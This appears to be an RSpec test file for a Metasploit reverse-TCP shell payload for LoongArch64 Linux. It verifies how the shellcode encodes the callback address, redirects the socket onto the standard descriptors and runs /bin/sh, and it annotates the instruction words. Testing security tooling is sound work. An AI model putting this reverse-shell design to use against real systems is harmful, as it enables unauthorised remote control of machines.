require 'spec_helper'

RSpec.describe 'modules/payloads/singles/linux/loongarch64/shell_reverse_tcp' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'linux/loongarch64/shell_reverse_tcp',
      ancestor_reference_names: ['singles/linux/loongarch64/shell_reverse_tcp']
    )
  end

  before do
    subject.datastore.merge!('LHOST' => '192.0.2.1', 'LPORT' => 4444, 'VERBOSE' => true)
  end

  # Decode the immediate fields independently of the generator, including the
  # sign extensions performed by LU12I.W and LU32I.D.
  def decoded_constant(words)
    value = ((words[0] >> 5) & 0xfffff) << 12
    value |= 0xffff_ffff_0000_0000 if value[31] == 1
    value |= (words[1] >> 10) & 0xfff
    value = (value & 0xffff_ffff) | (((words[2] >> 5) & 0xfffff) << 32)
    value |= 0xfff0_0000_0000_0000 if value[51] == 1
    (value & 0x000f_ffff_ffff_ffff) | (((words[3] >> 10) & 0xfff) << 52)
  end

  describe '#generate' do
    it 'matches the cached size' do
      expect(subject.generate.bytesize).to eq(subject.class::CachedSize)
    end

    [['192.0.2.1', 4444], ['192.0.2.128', 4481], ['192.0.2.255', 65535], ['0.0.0.0', 1]].each do |host, port|
      it "encodes the sockaddr for #{host}:#{port} in network byte order" do
        subject.datastore.merge!('LHOST' => host, 'LPORT' => port)
        words = subject.generate.unpack('V*')
        sockaddr = [decoded_constant(words[9, 4])].pack('Q<')
        expect(sockaddr).to eq([2].pack('v') + [port].pack('n') + host.split('.').map(&:to_i).pack('C4'))
      end
    end

    it 'rejects IPv6 addresses' do
      subject.datastore['LHOST'] = '::1'
      expect { subject.generate }.to raise_error(ArgumentError, /IPv4/)
    end

    it 'loads a terminated shell path' do
      words = subject.generate.unpack('V*')
      expect([decoded_constant(words[25, 4])].pack('Q<')).to eq("/bin/sh\x00")
    end

    it 'passes a terminated argv containing the shell path for BusyBox compatibility' do
      words = subject.generate.unpack('V*')
      expect(words[29, 7]).to eq([
        0x29c00064, # st.d a0,sp,0: store the shell path
        0x00150064, # or a0,sp,zero: point a0 to the path
        0x29c02064, # st.d a0,sp,8: argv[0] points to the path
        0x29c04060, # st.d zero,sp,16: argv[1] is NULL
        0x02c02065, # addi.d a1,sp,8: pass argv to execve
        0x03800006, # ori a2,zero,0: NULL envp
        0x002b0000  # syscall 0
      ])
    end

    it 'duplicates the saved socket onto descriptors 2, 1 and 0' do
      words = subject.generate.unpack('V*')
      expect(words[17, 6]).to eq([
        0x0380600b, # ori a7,zero,24: SYS_dup3
        0x03800c05, # ori a1,zero,3: begin above stderr
        0x03800006, # ori a2,zero,0: no flags
        0x001500e4, # or a0,a3,zero: restore the socket after each syscall
        0x02fffca5, # addi.d a1,a1,-1: next descriptor
        0x002b0000  # syscall 0
      ])
      branch = words[23]
      expect(branch >> 26).to eq(0x17) # BNE
      expect((branch >> 5) & 31).to eq(5) # compare a1
      expect(branch & 31).to eq(0) # against zero
      displacement = (branch >> 10) & 0xffff
      displacement -= 0x10000 if displacement[15] == 1
      expect(23 + displacement).to eq(19) # restart at flags setup
    end

    it 'zeroes the sockaddr padding before connecting' do
      expect(subject.generate.unpack('V*')[13, 2]).to eq([
        0x29c00065, # st.d a1,sp,0: family, port and address
        0x29c02060  # st.d zero,sp,8: sin_zero
      ])
    end

    it 'regenerates the callback address and port when the datastore changes' do
      original = subject.generate
      subject.datastore.merge!('LHOST' => '192.0.2.255', 'LPORT' => 65535)
      updated = subject.generate
      expect(updated).not_to eq(original)
      expect(updated.bytesize).to eq(subject.class::CachedSize)
      sockaddr = [decoded_constant(updated.unpack('V*')[9, 4])].pack('Q<')
      expect(sockaddr).to eq([2, 0, 255, 255, 192, 0, 2, 255].pack('C*'))
    end
  end

  describe '#load_const_into_reg64' do
    [0, 0x8000_0000, 0x8000_0000_0000_0000, 0xffff_ffff_ffff_ffff].each do |value|
      it "preserves all bits of #{value}" do
        expect(decoded_constant(subject.load_const_into_reg64(value, 5))).to eq(value)
      end
    end

    [-1, 1 << 64, nil, '123', 1.5].each do |value|
      it "rejects #{value.inspect}" do
        expect { subject.load_const_into_reg64(value, 5) }.to raise_error(ArgumentError)
      end
    end

    [4, 5].each do |register|
      it "loads the constant into register #{register} without changing another register" do
        words = subject.load_const_into_reg64(0x0123_4567_89ab_cdef, register)
        expect(words.map { |word| word & 31 }).to eq([register] * 4)
        expect((words[1] >> 5) & 31).to eq(register) # ORI source
        expect((words[3] >> 5) & 31).to eq(register) # LU52I.D source
      end
    end
  end
end
